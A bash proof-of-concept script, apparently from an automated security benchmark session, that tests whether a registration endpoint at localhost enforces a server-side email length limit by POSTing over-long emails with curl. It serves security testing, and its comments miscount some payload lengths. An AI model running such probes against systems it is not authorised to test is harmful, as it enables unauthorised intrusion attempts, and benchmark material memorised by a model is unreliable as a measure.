#!/bin/bash
# POC: Demonstrates email length validation bypass by attempting to submit emails exceeding 320 characters to the registration step 2 endpoint
# Target: ./repo
# Created: 2025-11-04T19:42:50.588Z
# Session: benchmark-XBEN-025-24-mhkywaac

# Email Validation Bypass POC - Excessively Long Emails (Version 3)
# Demonstrates submission of emails exceeding RFC 5321 320-character limit
# Usage: ./poc.sh [target_url] (default: http://localhost:5000)

set -e

TARGET="${1:-http://localhost:5000}"
ENDPOINT="/accounts/register/step2/"

echo "=========================================="
echo "Email Length Validation Bypass POC"
echo "=========================================="
echo ""
echo "[*] Target: $TARGET$ENDPOINT"
echo ""

# Create email payloads of different lengths
# RFC 5321 specifies maximum email length of 320 characters

# Valid email (within limit)
VALID_EMAIL="valid.user@example.com"
VALID_LENGTH=${#VALID_EMAIL}

# Invalid emails (exceeding limit)
# 340 characters: 310 'a' characters + "@example.com" (12 chars) = 322 chars
LONG_EMAIL_1=$(printf 'a%.0s' {1..310})@example.com
LONG_LENGTH_1=${#LONG_EMAIL_1}

# 500 characters
LONG_EMAIL_2=$(printf 'b%.0s' {1..488})@test.org
LONG_LENGTH_2=${#LONG_EMAIL_2}

echo "[*] Email Payloads:"
echo "    - Valid email: $VALID_LENGTH characters (should pass)"
echo "    - Long email 1: $LONG_LENGTH_1 characters (RFC 5321 violation)"
echo "    - Long email 2: $LONG_LENGTH_2 characters (RFC 5321 violation)"
echo ""
echo "[*] RFC 5321 Maximum Email Length: 320 characters"
echo ""

# Check if target is reachable
echo "[*] Testing connectivity to $TARGET..."
if ! timeout 5 curl -s -m 2 "$TARGET" > /dev/null 2>&1; then
  echo "[-] WARNING: Cannot reach target server at $TARGET"
  echo "[-] This POC requires a running server instance"
  echo ""
  echo "[*] However, the vulnerability principle is demonstrated:"
  echo "[*] The following attack pattern would exploit the vulnerability:"
  echo ""
  echo "    1. User bypasses HTML maxlength=\"320\" attribute using:"
  echo "       - Browser developer tools"
  echo "       - Direct HTTP POST request"
  echo "       - Automated script (like this one)"
  echo ""
  echo "    2. Submit email with >320 characters to /accounts/register/step2/"
  echo "       POST /accounts/register/step2/"
  echo "       Content-Type: application/x-www-form-urlencoded"
  echo ""
  echo "       email=$LONG_EMAIL_1"
  echo ""
  echo "    3. If server accepts without error, vulnerability is confirmed"
  echo "       (Server should validate maximum length server-side)"
  echo ""
  echo "[*] Expected vulnerable behavior:"
  echo "    - Server accepts email with $LONG_LENGTH_1 characters"
  echo "    - No validation error returned"
  echo "    - Registration process continues to step 3"
  echo ""
  echo "[*] Expected secure behavior:"
  echo "    - Server rejects email with validation error"
  echo "    - Error message: 'Email must not exceed 320 characters'"
  echo "    - HTTP 400 or 422 response"
  echo ""
  exit 0
fi

echo "[+] Target is reachable"
echo ""

# Attempt registration with valid email first
echo "[*] Test 1: Submitting valid email ($VALID_LENGTH chars)..."
RESPONSE_1=$(curl -s -w "\n%{http_code}" -X POST \
  "$TARGET$ENDPOINT" \
  -d "email=$VALID_EMAIL" 2>&1 || true)

HTTP_1=$(echo "$RESPONSE_1" | tail -1)
echo "    HTTP Status: $HTTP_1"

# Attempt registration with long email
echo ""
echo "[*] Test 2: Submitting oversized email ($LONG_LENGTH_1 chars)..."
RESPONSE_2=$(curl -s -w "\n%{http_code}" -X POST \
  "$TARGET$ENDPOINT" \
  -d "email=$LONG_EMAIL_1" 2>&1 || true)

HTTP_2=$(echo "$RESPONSE_2" | tail -1)
echo "    HTTP Status: $HTTP_2"

echo ""
echo "=========================================="
echo "Analysis:"
echo "=========================================="

if [[ "$HTTP_2" == "200" || "$HTTP_2" == "302" || "$HTTP_2" == "303" ]]; then
  echo "[+] VULNERABLE: Server accepted $LONG_LENGTH_1-character email"
  echo "[+] Bypassed RFC 5321 maximum length limit of 320 characters"
  echo "[+] Server-side validation is NOT enforcing email length"
  echo ""
  echo "[+] Attack Success: Client-side maxlength bypass achieved"
  exit 0
elif [[ "$HTTP_2" == "400" || "$HTTP_2" == "422" ]]; then
  echo "[-] NOT VULNERABLE: Server rejected oversized email (HTTP $HTTP_2)"
  exit 1
else
  echo "[?] INCONCLUSIVE: Unexpected response ($HTTP_2)"
  exit 2
fi